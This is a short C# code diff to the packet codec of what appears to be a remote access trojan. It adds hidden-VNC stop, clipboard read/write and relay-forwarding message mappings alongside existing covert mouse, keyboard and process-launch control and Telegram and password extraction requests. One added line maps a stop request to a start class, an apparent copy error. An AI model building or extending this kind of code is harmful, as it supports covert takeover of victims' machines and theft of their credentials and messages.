@@ -121,6 +121,10 @@ namespace RemoteControl.Protocals.Codec
             mappings.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, typeof(RequestMouseEvent));
             mappings.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, typeof(RequestKeyboardEvent));
             mappings.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, typeof(RequestHVNCRunProcess));
+            mappings.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, typeof(RequestHVNCStart));
+            mappings.Add(ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST, typeof(RequestClipboardGet));
+            mappings.Add(ePacketType.PACKET_HVNC_CLIPBOARD_GET_RESPONSE, typeof(ResponseClipboardGet));
+            mappings.Add(ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST, typeof(RequestClipboardSet));
 
             // TG提取与密码提取
             mappings.Add(ePacketType.PACKET_TG_EXTRACT_REQUEST, typeof(RequestTGExtract));
@@ -168,6 +172,8 @@ namespace RemoteControl.Protocals.Codec
             mappings.Add(ePacketType.CYCLER_RELAY_SELECT_CLIENT, typeof(Relay.RelaySelectClient));
             mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_ONLINE, typeof(Relay.RelayClientOnline));
             mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_OFFLINE, typeof(Relay.RelayClientOffline));
+            mappings.Add(ePacketType.CYCLER_RELAY_FORWARD, typeof(Relay.RelayDataFrame));
+            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_DATA, typeof(Relay.RelayDataFrame));
 
             return mappings;
         }
